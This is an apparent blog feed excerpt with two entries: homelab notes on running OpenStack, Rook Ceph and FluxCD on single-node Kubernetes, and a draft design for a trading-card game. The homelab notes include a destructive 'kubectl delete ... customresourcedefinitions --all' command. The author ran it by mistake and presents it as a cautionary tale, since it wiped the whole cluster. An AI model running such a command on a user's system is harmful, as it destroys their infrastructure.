<p>Here’s <a href="https://medium.com/@satheesh.mohandass/installing-rook-ceph-for-persistent-storage-on-single-node-openshift-c1102a8ced40">another blog post</a>. There is also an <a href="https://rook.io/docs/rook/latest-release/Getting-Started/example-configurations/#cluster-crd">offical test cluster</a>.</p>
<p>I attempted to deploy the test cluster:</p>
<div class="sourceCode" id="cb79" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb79-1">kubectl apply -f https://raw.githubusercontent.com/rook/rook/refs/heads/release-1.16/deploy/examples/cluster-test.yaml</span></code></pre></div>
<p>And… nothing seems to happen. No pods being created. No deployments being done. Nothing. It’s partially because I didn’t clean up properly. According to <a href="https://brettweir.com/blog/remove-rook-from-cluster/">another blog post</a> you have to edit the finalizers on the ceph storage resources (cephblockpool, etc), and set them to null in order for them to get deleted.</p>
<p>So I recently went to <a href="../../blog/scale-22/">scale</a> and:</p>
<blockquote class="blockquote">
<p>I went to the first meeting, and was immediately introduced to an interesting software — <a href="https://docs.rackspacecloud.com/genestack-components/">genestack</a>. Unlike openstack helm, it doesn’t seem to <em>require</em> rook ceph, despite being a kubernetes deployment, which makes it very appealing. Currently, I am attempting to deploy Openstack on my single Kubernetes server, using FluxCD and Openstack-helm, but I am encountering a blockage because ceph doesn’t like being deployed on a single node.</p>
</blockquote>
<p>I am looking into the <a href="https://github.com/rackerlabs/genestack/">genestack</a> code to figure out how they did it, but haven’t spotted much yet, except for:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>cinder-values.yml</strong></pre>
</div>
<div class="sourceCode" id="cb80" data-filename="cinder-values.yml" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb80-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">storage</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> lvm</span></span></code></pre></div>
</div>
<p>It seems to be possible to set this value to something other than the “ceph” it is set to in the official openstack-helm repo… but there is no documentation on this. Looking at the code of glance, however:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>glance-values.yaml</strong></pre>
</div>
<div class="sourceCode" id="cb81" data-filename="glance-values.yaml" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb81-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># limitations under the License.</span></span>
<span id="cb81-2"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Default values for glance.</span></span>
<span id="cb81-3"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># This is a YAML-formatted file.</span></span>
<span id="cb81-4"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Declare name/value pairs to be passed into your templates.</span></span>
<span id="cb81-5"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># name: value</span></span>
<span id="cb81-6"></span>
<span id="cb81-7"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># radosgw, rbd, swift or pvc</span></span>
<span id="cb81-8"><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">---</span></span>
<span id="cb81-9"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">storage</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> swift</span></span></code></pre></div>
</div>
<p>So maybe there is some kind of standardized interface, which people can select storage options for openstack? But I don’t see anything like that in the code for Openstack-Helm Cinder.</p>
<p>I should also take a look at StarlingX, since that also seems to be able to do a single node ceph install.</p>
<div class="sourceCode" id="cb82" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb82-1">Mgr:</span>
<span id="cb82-2">    Allow Multiple Per Node:  false</span>
<span id="cb82-3">    Count:                    2</span>
<span id="cb82-4">Mon:</span>
<span id="cb82-5">  Allow Multiple Per Node:  false</span>
<span id="cb82-6">  Count: 3</span></code></pre></div>
<p>It seems that my attempts to change the number of monitors and managers to one is failing. Actually, upon further inspection, it seems to initially have the number correct, but then later changes it to be wrong.</p>
<p>Note for the future: Rook Operator and Rook ceph cluster helm charts don’t seem to sync versions with the actual ceph software.</p>
</section>
</section>
<section id="ssoconnections" class="level2">
<h2 class="anchored" data-anchor-id="ssoconnections">SSO/connections</h2>
<p>The <a href="https://docs.openstack.org/openstack-helm/latest/install/prerequisites.html">prerequisites section</a> details how to give the openstack services external domain name access in the MetallLB section.</p>
<p>Also:</p>
<blockquote class="blockquote">
<p>First, let’s create a namespace for the OpenStack workloads. The ingress controller must be deployed in the same namespace because OpenStack-Helm charts create service resources pointing to the ingress controller pods which in turn redirect traffic to particular Openstack API pods.</p>
</blockquote>
<p>This does not seem to be true. Ingresses are seemingly created properly, but my ingress controller is in the <code>default</code> namespace.</p>
</section>
<section id="a-big-screwup" class="level2">
<h2 class="anchored" data-anchor-id="a-big-screwup">A big screwup…</h2>
<p>I got this error:</p>
<pre><code>moonpie@cachyos-x8664 flux-config]$ kubectl get -n openstack helmreleases.helm.toolkit.fluxcd.io rook-ceph-operator
NAME                 AGE   READY   STATUS
rook-ceph-operator   66s   False   Helm install failed for release openstack/rook-ceph-operator with chart rook-ceph@v1.15.6: Unable to continue with install: CustomResourceDefinition "cephblockpoolradosnamespaces.ceph.rook.io" in namespace "" exists and cannot be imported into the current release: invalid ownership metadata; annotation validation error: key "meta.helm.sh/release-name" must equal "rook-ceph-operator": current value is "rook-ceph"</code></pre>
<p>And I thought “Why don’t I just delete all the CRD’s so it can start over? Surely, with gitops, it must all redeploy automatically!</p>
<p>So I ran:</p>
<pre><code>kubectl delete -n openstack customresourcedefinitions.apiextensions.k8s.io --all</code></pre>
<p>I foolishly assumed that this would only delete crd’s created by resources in the openstack cluster… that was not the case. It deleted ALL my CRD’s, and the flux-system GitRepository is now gone.</p>
<p>Firstly, since everything else, secrets, volumes, and so on seems to still be there, I decided to simply reboostrap:</p>
<pre><code>[moonpie@cachyos-x8664 flux-config]$ flux bootstrap git --url ssh://moonpie@moonpiedumpl.ing:22022/home/moonpie/flux-config --branch=main --private-key-file=/home/moonpie/.ssh/moonstack --verbose --timeout=600s
► cloning branch "main" from Git repository "ssh://moonpie@moonpiedumpl.ing:22022/home/moonpie/flux-config"
✔ cloned repository
► generating component manifests
✔ generated component manifests
✔ component manifests are up to date
► installing components in "flux-system" namespace
✗ timeout waiting for: [CustomResourceDefinition/helmreleases.helm.toolkit.fluxcd.io status: 'Terminating', CustomResourceDefinition/kustomizations.kustomize.toolkit.fluxcd.io status: 'Terminating']</code></pre>
<p>I ended up uninstalling and reinstalling kubernetes. But in the future, I should consider using RKE2’s <a href="https://docs.rke2.io/datastore/backup_restore">built in snapshots</a>.</p>
</section>
</section>
<section id="nextcloud" class="level1">
<h1>Nextcloud</h1>
<p>Official Nextcloud Community Helm chart:</p>
<p><a href="https://artifacthub.io/packages/helm/nextcloud/nextcloud" class="uri">https://artifacthub.io/packages/helm/nextcloud/nextcloud</a></p>
<p><a href="https://github.com/nextcloud/helm" class="uri">https://github.com/nextcloud/helm</a></p>
<p><a href="https://help.nextcloud.com/t/helm-chart-needs-to-support-oidc-by-default/205162">Discussion about lack of OIDC in the helm chart</a>.</p>
</section>
<section id="misc-notes-for-later-on" class="level1">
<h1>Misc Notes for later on:</h1>
<ul>
<li>https://github.com/stakater/Reloader — reload services in kubernetes when configmap or secrets change</li>
</ul>
<p><a href="https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/install-guide.html#installing-with-apt">Nvidia container toolkit apt docs</a></p>
<p><a href="https://artifacthub.io/packages/helm/openfga/openfga" class="uri">https://artifacthub.io/packages/helm/openfga/openfga</a> — Incus uses OpenFGA for authentication.</p>
<p>Openstack: <a href="https://docs.openstack.org/openstack-helm/latest/install/openstack.html" class="uri">https://docs.openstack.org/openstack-helm/latest/install/openstack.html</a></p>
<p>Automatic dependency updates: <a href="https://docs.renovatebot.com/modules/manager/flux/" class="uri">https://docs.renovatebot.com/modules/manager/flux/</a></p>
<p><a href="https://github.com/substratusai/kubeai" class="uri">https://github.com/substratusai/kubeai</a> — Reallly easy deployment of LLM’s.</p>


</section>

 ]]></description>
  <category>projects</category>
  <guid>./projects/build-server-5/</guid>
  <pubDate>Thu, 12 Sep 2024 07:00:00 GMT</pubDate>
</item>
<item>
  <title>The Ultimate Card Game</title>
  <link>./playground/cardgame/</link>
  <description><![CDATA[ 




<section id="game-setuplayout" class="level1">
<h1>Game Setup/Layout</h1>
<p>Traditional Deck + Hand style. How many in a hand? I’m thinking 7.</p>
<p>Players start with no mana, but can spend from life</p>
<p>Life: Players start with 16 life Life can also be used to cast cards, which is basically the only way to cast cards before “factory” type cards are on the field or via 0 or negative cost cards.</p>
<p>During the “block” phase of an attack, the blocking player can either cast 0 (or negative) cost cards, or cast cards using life. This makes cards effectively “instants”, allowing players to bring stuff on the field at the opponent turn, but at some price, as the cards must be either &lt; 0 cost or paid with life.</p>
<p>Cards play in their “stunned” state. AkA: cards cannot attack first turn after playing (Might change if I adjust how cards do damage)</p>
<p>Players can pay production to nerf cards. It costs X * N where N is the total amount of aspect points a card has in that aspect, to reduce that aspect by one. N does not change. So to completeley destroy a 3 health card, it costs 27 production points. To remove one of an 8 aspect card, it’s 8 production points, 2 is 16, etc.</p>
<section id="gamemodes" class="level2">
<h2 class="anchored" data-anchor-id="gamemodes">Gamemodes:</h2>
<p>Best of 1, 16 life.</p>
<p>Best of 3, 16 life.</p>
<p>Alternate: Half of cards in graveyard go to exile, the other half go to the bottom of the players deck. Either completely random, pseudorandom, or complete player choice. Note: why is this better than multiple rounds? This could also be a seperate gamemode.</p>
<p>Players have no life, but instead have a shared number line that acts as life. But, if the players have a certain difference between their opponent, then they lose. This difference starts as 2^32 or some other arbitrarily high power of two. But, it halves with every turn (or maybe every half turn?), eventually reducing itself down to one where it stays there.</p>
<p>C*mmander: Players get to start with a 64 (more than legendary, or maybe 128) value card on the board. If it dies they lose? Or maybe they can recast it and they have player life.</p>
</section>
</section>
<section id="card-design" class="level1 page-columns page-full">
<h1>Card Design</h1>
<p>Round up (?)</p>
<p>Rarity system:</p>
<p>Legendary: 32 + cost</p>
<p>Epic: 16 + cost</p>
<p>Rare: 8 + cost</p>
<p>Common: 4 + cost</p>
<p>30 cards in a deck</p>
<p>Card ratios must be: (minimum 15/30 cards, probably 30)</p>
<p>2 legendaries, 4 epic, 8 rare, and 16 common for 30 total. You can have more, but you must maintain that ratio.</p>
<p>Negative cost cards give player production points to use, in addition to being instants.</p>
<p>Attack/defense:</p>
<p>5 card draws at the beginning of the turn: Can be used instead to the card effect.</p>
<p>Cards:</p>
<hr>
<p>Card name, mana cost</p>
<p>Poorly drawn image</p>
<p>Detail text/keywords</p>
<p>Flavor text</p>
<p>————- Attack Power/Health/Production power</p>
<p>Alternate Card design:</p>
<p>Card Name</p>
<p>Either under or next to name: base costs + addons – (negative production cost increaste) – rarity cost add = mana/production cost</p>
<p>attack/ power, vertically down the left side of the card</p>
<p>(number) Card trait</p>
<p>Flavor text</p>
<p>Card “Shop”</p>
<p>Traits cost Trait Number * N where N is the total amount of traits</p>
<section id="offensivedefensive-trait-spreadsheet" class="level2 page-columns page-full">
<h2 class="anchored" data-anchor-id="offensivedefensive-trait-spreadsheet">Offensive/Defensive Trait Spreadsheet</h2>
<div class="column-screen-inset">
<table class="caption-top table">
<colgroup>
<col style="width: 50%">
<col style="width: 50%">
</colgroup>
<thead>
<tr class="header">
<th>Offensive Trait</th>
<th>Defensive Equivalent</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Attack: This card does X damage, or has X health</td>
<td>Health: This card has X health</td>
</tr>
<tr class="even">
<td>Multi-Attack: During combat phase, this card can launch and extra attack (solo or with others?) up to X extra times</td>
<td>Shield: This card has X sets of it’s health, and a single attack, no matter how much damage it is, can only break a single shield</td>
</tr>
<tr class="odd">
<td>Spellstorm: For every token applied to this card by the controller, actually X tokens are applied, and these applications count for the purposes of triggers</td>
<td>Spellshield: For every X token applied to this card by opponent, this card is only affected by 1/X of them. If less than X-1 are applied, then this card isn’t affected at all</td>
</tr>
<tr class="even">
<td>Weight: This card is equivalent to X-1 cards for the purposes of moving it</td>
<td>Strength: This card can move X more cards than it could usually move, but they must be next to eachother OR could move X cards from further away, like a reach type mechanic</td>
</tr>
<tr class="odd">
<td>Agility: This card can move over X cards it wouldn’t normally be able to move over</td>
<td>RestrictionTypeThing: This card restrict movement of cards over, or onto itself</td>
</tr>
<tr class="even">
<td>MultiAttack (needs different name): This card can hold more than one card under it, and even move with more than one card under it, up to X extra cards</td>
<td>MultiBlock (needs different name): This card requires X more cards on top of it to be able to move past it. The extra cards on top of it, fight the card independently, and do not deal cumulative damage (or take less damage than this cards whole attack stat)</td>
</tr>
<tr class="odd">
<td>Buyback: Pay base cost - X when casting this card or when it’s on the field. Then, when it dies, it returns to your hand instead of going to the graveyard. (too weak. maybe mtg storm?)</td>
<td>Recursion: This card can be cast from the graveyard for the base cost - X recursion tokens on it (maybe X * N?)</td>
</tr>
<tr class="even">
<td>Integrate: Pay N * N production points to combine this card with another card, stacking all values. Integrated cards count as one card, even when targeted by another integrate card, but the calculation becomes N3 * (N1 + N2) (Goals: Replace mtg archetype voltron, mtg keywords equip, fortify, enchant, mutate, merge, meld)</td>
<td>Debuff/Attatch Curse: X: Pay N + N – X points to apply a debuff to a card with value N, where all the aspects of this card are subtracted from that card. Actives and Curses carry over. The card can be considered to be “recast” and curses activate immediately.</td>
</tr>
</tbody>
</table>
</div>
</section>
<section id="offensive-aspects" class="level2">
<h2 class="anchored" data-anchor-id="offensive-aspects">Offensive Aspects:</h2>
<p><strong>Attack</strong>: X Give this card the ability to attack, and 1 + X attack power. Cards need at least one attack to be able to block.</p>
<p><strong>Double Tap</strong>: 1 + ??: Card has does a second attack which happens before the first one in an encounter, doing extra damage. Opponent can pay some porportion of production to remove some proportion of double tap from a card.</p>
<p>Alt idea: During each section of the combat phase, player can chose to do extra damage with this card towards cards it is over/under.</p>
<p>Goals: Shield-remove, replace mtg keyword deathtouch.</p>
<p><strong>Spellbuff</strong>: tokens applied to this card by it’s controller are multiplied, and count as that many applications of that token.</p>
</section>
<section id="defensive-aspects" class="level2">
<h2 class="anchored" data-anchor-id="defensive-aspects">Defensive Aspects:</h2>
<p><strong>Health</strong>: Base + X Give this card health trait and 1 + X hit points. (note: If a card has no health, it disappears at the end of a turn).</p>
<p><strong>Multi Block</strong>: 1 + X block more than one attacker of a target, per target blocked, up to 2 + X</p>
<p><strong>Multi-Target-Block</strong>: 1 + X: Block for more than one card, although only one attacker per target, up to 2 + X stacks with multi block with</p>
<p><strong>Anti-AoE</strong>: Base:1 + X add this cards health power to hower many</p>
<p><strong>Merged Block</strong>: Base:1 + X: This card can do a merged block, which is mostly treated as one block. The health of merged blockers is “pooled” where they all share damage. To kill all cards in the merged block, and attacker must outdamage the pool. (Should merged block allow merging of traits?) (and should merged block allow blocking multi-block?)</p>
<p>Idea: No merging of traits. Stacks with other defensive traits. Allows for multi-blocking, of one card, but doesn’t</p>
<p><strong>Collective Block</strong>: 1 + X. If multiple cards are blocking one card, they gain a “health” pool, where they all share damage. To kill all cards pooling cards, they must deal enough damage to overcome the “health pool” This card can pool with X cards. Cannot health pool with cards with greater health than itself. Blocking is treated as a merged block, where something like “damage multiplication” can split up the health pool again.</p>
<p>Do I want collective block to merge traits as well?</p>
<p><strong>Shield</strong>: X: Card gets a seperate “shield of X hit points. If they are damaged by one attack/encounter, it doesn’t rollover into their HP. Opponent(s) can pay production points to reduce the shield value. Shield points can also be spent to reduce active effects</p>
<p>Goals: Replace mtg keywork indestructuble. Replace clash royale shield mechanic Maybe replace hexproof with a resist spell mechanic?</p>
<p><strong>Spellshield</strong>: X : X : For every X spell effects applied to it, it is only influenced by (X - 1 / X) of them. E.g: spellshield 2 means that it halves spell effects applied. 3 means it 1/3rds them and so on. This can be reduced by paying production (?)</p>
<p>Goal: replace mtg hexproof/ward. What’s offensive equivalent?</p>
</section>
<section id="misc-aspects" class="level2">
<h2 class="anchored" data-anchor-id="misc-aspects">Misc Aspects:</h2>
<p><strong>Integrate</strong>: X: X Pay N * N production points to combine this card with another card, stacking all values. Integrated cards count as one card, even when targeted by another integrate card, but the calculation becomes N3 * (N1 + N2)</p>
<p><strong>Debuff/Attatch Curse</strong>: X: Pay N + N – X points to apply a debuff to a card with value N, where all the aspects of this card are subtracted from that card. Actives and Curses carry over.</p>
<p>How to remove? Pay cost? Card death?</p>
</section>
<section id="active-traits" class="level2">
<h2 class="anchored" data-anchor-id="active-traits">Active Traits:</h2>
</section>
<section id="table" class="level2">
<h2 class="anchored" data-anchor-id="table">Table</h2>
<table class="caption-top table">
<colgroup>
<col style="width: 25%">
<col style="width: 25%">
<col style="width: 25%">
<col style="width: 25%">
</colgroup>
<thead>
<tr class="header">
<th>Active</th>
<th>Cost (* N) : Output</th>
<th>Application Cost?</th>
<th>Effect</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Mana Generation (probably call it just Mana for short)</td>
<td>X : X * N (*N? probably not)</td>
<td>N/A</td>
<td>Generates Mana for casting things</td>
</tr>
<tr class="even">
<td>Stealth</td>
<td>X : X</td>
<td>Don’t know.</td>
<td>N/A</td>
</tr>
<tr class="odd">
<td>Necromancy (or maybe recursion?)</td>
<td>X : X</td>
<td>Don’t know, probably not</td>
<td>Apply to cards in your graveyard. Then, those cards can be cast for base cost - amount of Necromancy/Recursion tokens applied to them again. (or maybe base cost - X*N?)</td>
</tr>
<tr class="even">
<td>Scry/Tutor</td>
<td>X : X (*N?)</td>
<td>Don’t know, probably</td>
<td>N/A yet. Probably look at X cards or look at cards with up to X production point cost</td>
</tr>
<tr class="odd">
<td>Polarity Reversal</td>
<td>X : X (*N?)</td>
<td>Probably not</td>
<td>Change offensive abilities to their defensive equivalents defensive and vice versa, of a single card</td>
</tr>
<tr class="even">
<td>Phase/Empherality</td>
<td>X : X</td>
<td>Probably not</td>
<td>Decrease the amount that a card can interact, or be interacted with by X. Does X less damage, or but takes X less damage. How should this interact with</td>
</tr>
<tr class="odd">
<td>Counterspell</td>
<td>X : X</td>
<td>Maybe a mechanic where counterspell can take from existing aspects on board, but it costs production</td>
<td>Either take a token that opponent is holding directly, or take a token on the board.</td>
</tr>
<tr class="even">
<td>Replicate</td>
<td>X : X</td>
<td>Maybe a mechanic where replicate can take from existing aspects on board, but it costs production</td>
<td>Copy a token that is in play or that anyone is holding</td>
</tr>
<tr class="odd">
<td>Gain Life</td>
<td>X : X</td>
<td>1 production point per token</td>
<td>Gain life when applied</td>
</tr>
<tr class="even">
<td>Burn (direct damage)</td>
<td>X : X</td>
<td>probably</td>
<td>Apply direct damage to any card or your opponent, as long as their is a card path from you to that card or your player</td>
</tr>
<tr class="odd">
<td>Arbitrary Aspect (trigger?)</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr class="even">
<td>Arbitrary Negative Aspect</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<ul>
<li>So the idea behind “actives” is that they generate points/tokens that can be spent on things — but don’t have to be spent. The actives that cost production to use, only cost production on the application of the active, rather than the generation/creation of the points.</li>
</ul>
<p><strong>Mana Generation</strong>: X: X * N . Generate mana for casting things</p>
<p>Give opponent production points: Goal: replicate elixir golem mechanic from clash royale. Problems: Too weak. Decks which use less or no production won’t be affected by this. Needs an alternate ability along with give opponent production points, such as giving opponent another active.</p>
<p><strong>Stealth</strong>: Base:1 + X Take 1 + X cards off the field… and then put them back on face down in new spots. Stealthed cards are revealed when they take action, attack, or are dealt damage. Stealth can also be used to move around cards during the blocking phase.</p>
<p>Cost:</p>
<p>Goal: Twofold: Obscure cards on board, but also allow to move cards in blocking (or attacking?) phases around. Blue idea, playing with information</p>
<p><strong>Necromancy</strong>: Base:1 + X Search 1 + X through the bottom of the deck/graveyard. Cast a cards base cost, rather than their total creation point cost.</p>
<p>Goal: Play the roal of black deck, bringing cards back from the dead. Replace mtg https://mtg.fandom.com/wiki/List_of_Magic_slang#Recursion recursion</p>
<p><strong>Tutor</strong>: Cost Base:1 + X, look at the top X cards of your deck and show them to your oppnent. You can cast directly from these cards. Problem: Recursive scry/tutor too op</p>
<p>Goal: Play the role of blue deck, increasing options player has.</p>
<p><strong>Polarity Reversal</strong>: X: Change offensive abilities to their defensive equivalents defensive and vice versa, of a single card, up to X * N of a single trait</p>
<p>Goal: Buff and nerf at the same time. Can be used to reduce health, or increase attack.</p>
<p><strong>Counterspell</strong>: Base:1 + X: You “take control” of 1 + X “spell” aspects targeting individual things. Problem: How will counterspell and react phases work? Do I want this? It adds extra complexity to casting. Idea: Counter either 1 + X damage/protection/production (distributed) or 1 + X spell effects targeting stuff.</p>
<p>Goal: play the role of the blue counterspell, while also allowing them to deny production points</p>
<p><strong>Replicate</strong>: X: Duplicate active effects, excluding replicate effects. Can duplicate opponents effects, or own. Can replicate counterspell.</p>
<p><strong>Aspect Enhancement</strong>: X: Enhance any aspect of card(s) up to X. Costs (initial aspect cost) + X * N production points. * Having this cost mana is kinda weak.</p>
<p><strong>Gain Life</strong>: X: X and pay X production points to do so</p>
<p><strong>Deny attackers</strong>. Some kind of stop attacker from attacking mechanic.</p>
<p>Also want active?</p>
<p>I want some kind of burn effect/direct damage, without it being broken.</p>
<p><strong>Burn/Direct damage</strong>: X: X: Deal direct damage to opponent, but this requires that you must pay production for each damage done, and damage is limited by defensive cards under your cards along the path.</p>
<p><strong>Abitrary Active/Trigger</strong> : Produce actives/triggers to place on cards. Should this cost production to apply?</p>
<p><strong>Arbitrary Negative Active/Trigger</strong>: Produces negatives to put on cards. Negative health is straightforward, but negative damage, “agility”, and etc get interesting.</p>
<p><strong>Empheral</strong>: Cause a card to not be affected by stuff, but also not be able to affect stuff. Basically mtg phase.</p>
</section>
<section id="triggers" class="level2">
<h2 class="anchored" data-anchor-id="triggers">Triggers:</h2>
<table class="caption-top table">
<colgroup>
<col style="width: 25%">
<col style="width: 25%">
<col style="width: 25%">
<col style="width: 25%">
</colgroup>
<thead>
<tr class="header">
<th>Trigger Name</th>
<th>Output</th>
<th>Multi-Activate</th>
<th>Triggers on?</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Instead of card draw</td>
<td>X * N</td>
<td>Probably Not</td>
<td>Players decide to do this instead of drawing one of their five cards they can draw</td>
</tr>
<tr class="even">
<td>On card play</td>
<td>X * N</td>
<td>No</td>
<td>Generates actives when this card is played</td>
</tr>
<tr class="odd">
<td>Familier Friends</td>
<td>X</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p><strong>Familiar friends</strong>: X: When you play a card with similar trait and valuet and value appears, including this specific trigger + active, Do up to 1 + X of an active trait, based on the common traits and values that are shared.</p>
<p>Note: Too op if it includes health, attack, and friends… but is it?</p>
<p>Also: Familiar friends… but on death?</p>
<p><strong>Damage dealt via attacking or blocking</strong> (including or excluding overkill): X : X</p>
<p><strong>Damage taken</strong> (including or excluding shield?): X : X</p>
<p>Goal: Replace elixir golem clash royale</p>
<p><strong>Card enters play</strong>: X: X * N</p>
<p><strong>Instead of card draw</strong>: X: X * N</p>
<p><strong>Pay production points</strong>: I want this mechanic, but do not know how to balance it</p>
<p><strong>Getting attacked by X cards</strong>: X: X</p>
<p><strong>When XYZ active token is applied</strong>: X : X</p>
<p>Most notable of this is: “when lifegain” as that has very good synergy</p>
<p>Problem (?): Can go infinite.</p>
<p><strong>When opponent takes damage</strong>: X : X</p>
<ul>
<li>This could lead to going infinite with “burn” tokens.</li>
</ul>
<p><strong>Formation: When pattern created during attack/defense phase</strong>: Form a pattern of your own cards (must be on on top): X : X * (cards with same trigger in the pattern) * (amount of different patterns linked together):</p>
<p>Eg: A pattern can be a straight line, or a curved line, or a grouping of three, a lightning bolt or whatever. Orientation does not matter (?), only relative orientation does.</p>
<p>Probably a better way to do this.</p>
<p>Maybe: Outputs X * (total in chain) * (complexity of chain/amount of extra connections for every node with more than one connection) * (cards with same trigger in chain) * (Amount of overlapping cards that are also part of a different formation)</p>
<p>Maybe too powerful?</p>
<p>Goal: Replace tribal, allow for synergy without being contrived/artificial. The synergy is artificial, but players have to work for it.</p>
</section>
<section id="curses" class="level2">
<h2 class="anchored" data-anchor-id="curses">Curses:</h2>
<p><strong>Constant Mana Cost</strong>: Take X mana from the player every turn, or if they can’t provide that, life. In exchange, offer X * N card creation points for players to use. Essentially for each negative mana point, they can add one of each trait for each negative mana point during the turn. Must be paid before the attacking step.</p>
<ul>
<li>Should it die if no mana given?</li>
<li>Or should it take from life?</li>
<li>What about production? Probably not effect actives… but I like the idea of cumulative upkeep for a spell tower.</li>
</ul>
<p>I think I need to separate this into two different curses: One which does damage, and one that doesn’t.</p>
<p><strong>Day/Night</strong>: X from anything: X Opponent gains control of this card during their turn, except the card doesn’t have full stats. It only has X stats, X for each trait in place. It also gains X stats in the opposite section of held traits. So 4 hp, but 0 attack, but 2 X becomes 2 hp, 2 attack.</p>
<p>How to handle one time spell cards? * Day/night results in the card staying alive, even when it has 0 or less health * Opponent gets a portion of spell effects * Daynight straight up doesn’t affect actives ← I like this one</p>
<p>May need different name, mtg already has daynight. Traitor? Betrayal? Doublecross? Doubleagent?</p>
<p><strong>Bounce</strong>:</p>
<p>Card on field goes to hand, in exchange for a card that has a base cost less than Cost – X base cost. If there is no such card, then this card goes to the graveyard. You can keep the card on the field in exchange for a sacrifice of at least Cost + X * N from your hand or the field, straight to the graveyard.</p>
<ul>
<li>Beginning or end of turn (it would be nice to bounce immediately)</li>
<li>How to have card be persistent?</li>
</ul>
<p>At beginning of turn, or when card is attempted to be played, take it off the field for a card in hand with base value &lt; cost – X, or sacrifice card from field with cost + X?</p>
<p>AKA: some kind of bounce curse</p>
<p>At beginning of turn or before played, take cards on the field that are worth more/less than something off the field and put them back into your hand. If you cannot do this, because of a full hand or because of the value</p>
<p>On/before turn, bounce cards value back to hand. If you can’t do that, then bounce this card, exchanging it for something in your hand with less than X. If can’t do that, then graveyard.</p>
<p>On turn, and/or when this card is played, return this cards value +</p>
<p><strong>Siege/Battle</strong>: X from anything: X card is cast as an X health card under an opponents control. They must defend it, if the attacking player manages to kill it, then it becomes the normal card</p>
<ul>
<li>Allow spell damage to kill the battle?</li>
</ul>
<p>Goal: replace siege/battle from mtg</p>
<p><strong>Equality</strong>: X from triggers/actives: X times N this card gives opponent up to X*N of of “actives” it generates, when it generates them.</p>
<p>Goal: Allow for the creation of board wipe type effects.</p>
<p><strong>Sacrifice</strong> X from anything : X You need to sacrifice cards with a base cost of X * N cards on the field when played.</p>
</section>
<section id="misc-notes-and-workshopping" class="level2">
<h2 class="anchored" data-anchor-id="misc-notes-and-workshopping">Misc Notes and Workshopping:</h2>
<p>Goals: Replace mtg creature tokens, mtg evasion mechanics (keywords flying, horsemanship, unblockable, trample, etc)</p>
<p>https://mtg.fandom.com/wiki/Evasion_ability</p>
<p>Resources (used to do stuff):</p>
<ul>
<li>Mana/Production (can cast from life)
<ul>
<li>Life</li>
</ul></li>
<li>Cards in hand (artificially increased by scry)
<ul>
<li>Draw counts</li>
</ul></li>
<li>Cards on field</li>
<li>Cards in graveyard</li>
<li>Board space?</li>
</ul>
<p>I want synergy to happen, but for the synergy to use up one of the other resources, preventing snowballing/ an infinite combo.</p>
<p>Maybe I need another resource?</p>
<p>Catch up mechanics?</p>
<ul>
<li>I like the “equality” curse</li>
<li>But I want one more</li>
</ul>
<p>Some kind of meta card attribute?</p>
<p>Potential keywords:</p>
<p>Recursion: X : X Pay Base Cost – X to cast this card from your graveyard</p>
<p>Buyback: X : X Pay Cost – X in addition to casting this spell to return it to your hand when you cast it.</p>
<ul>
<li>Too weak</li>
</ul>
<p>Banding/Splitting: Combine and divide mechanics somehow (or maybe I should build these into the game rules)</p>
<p>Anti-Actives</p>
<p>Take life: X :X</p>
<p>Idea is to have taxes or some sort of sin mechanic.</p>
<p>Gain +X +X when X: Idea is some conditional gain strength mechanic</p>
<p>In general, I want some kind of state based trigger, that can activate every turn.</p>
<p>When X cards on the field. When X cards in graveyard. X in hand? etc. How to make fair?</p>
<p>Okay, after watching <a href="https://www.youtube.com/watch?v=HuAkw707oOA">A video about lifedecking</a>, I’ve realized that it’s problematic to incentivize cards in the graveyard, because players want to <em>play</em> their cards, and a strategy which incentives sacrifice or something along those lines isn’t really that. But, this problem with lifedecking also applies to <em>any</em> incentive to maintain a “state” of the game. Although an ongoing incentive to maintain a certain boardstate is good to get to, it also incentivizes players to <em>keep</em> that board state — which may not be fun. So this will be put on hold for a while, and instead, I will only incentive <em>actions</em> by the players. Interesting =/= fun to play.</p>
<p>Alternate cost where players can pay other token types. Maybe decreases N or lets them pay base cost. This can be a curse type.</p>
<p>Tax and Stax: Fundamentally, a tax an opponent can’t pay to do something is like a stax: Some kind of opponent restrictions… actually, I don’t like this. I want a control archetype, but I confused control with stax/tax. Clash Royale manages to have control be a major archetype without s/tax.</p>
<ul>
<li>Opponent can’t X doesn’t work because of the way my game is designed. However, opponent can’t do X fundamentally equivalent to a tax effect that the opponent can’t afford to play?</li>
</ul>
<p>Formation application token: Allow for multiplication of tokens on the battlefield. Costs X1 * X2 * X3 * N where X1 is the multiplication and X2 is the formation size, and X3 is the total tokens it can take. So a 2 * 1 * 3 would double up to three tokens for a single card.</p>
<p>Some kind of sacrifice cards curse.</p>
<p>See also: MTG emerge</p>
<p>MTG Surge</p>
<p>MTG rebound</p>
<p>MTG storm: Pay X to duplicate the on-cast effects of this card?</p>
</section>
</section>
